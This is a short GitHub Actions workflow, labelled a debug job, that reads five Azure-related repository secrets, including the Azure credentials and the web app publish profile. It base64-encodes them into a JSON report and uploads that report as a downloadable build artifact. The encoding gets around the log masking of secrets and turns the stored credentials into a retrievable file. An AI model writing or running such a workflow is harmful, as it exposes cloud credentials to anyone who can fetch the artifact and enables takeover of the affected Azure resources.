name: Z01 - Debug Secret Values

on:
  workflow_dispatch:

jobs:
  debug:
    runs-on: ubuntu-latest
    env:
      ACR_LOGIN_SERVER: ${{ secrets.ACR_LOGIN_SERVER }}
      AZURE_CREDENTIALS: ${{ secrets.AZURE_CREDENTIALS }}
      AZURE_TENANT_ID: ${{ secrets.AZURE_TENANT_ID }}
      AZURE_WEBAPP_PUBLISH_PROFILE: ${{ secrets.AZURE_WEBAPP_PUBLISH_PROFILE }}
      KEY_VAULT_ADMIN_OBJECT_ID: ${{ secrets.KEY_VAULT_ADMIN_OBJECT_ID }}

    steps:
      - name: Save secrets (base64 encoded)
        run: |
          cat > secrets-report.json <<EOF
          {
            "ACR_LOGIN_SERVER": "$(echo -n "$ACR_LOGIN_SERVER" | base64)",
            "AZURE_CREDENTIALS": "$(echo -n "$AZURE_CREDENTIALS" | base64)",
            "AZURE_TENANT_ID": "$(echo -n "$AZURE_TENANT_ID" | base64)",
            "AZURE_WEBAPP_PUBLISH_PROFILE": "$(echo -n "$AZURE_WEBAPP_PUBLISH_PROFILE" | base64)",
            "KEY_VAULT_ADMIN_OBJECT_ID": "$(echo -n "$KEY_VAULT_ADMIN_OBJECT_ID" | base64)"
          }
          EOF

      - name: Upload report
        uses: actions/upload-artifact@v4
        with:
          name: secrets-report
          path: secrets-report.json
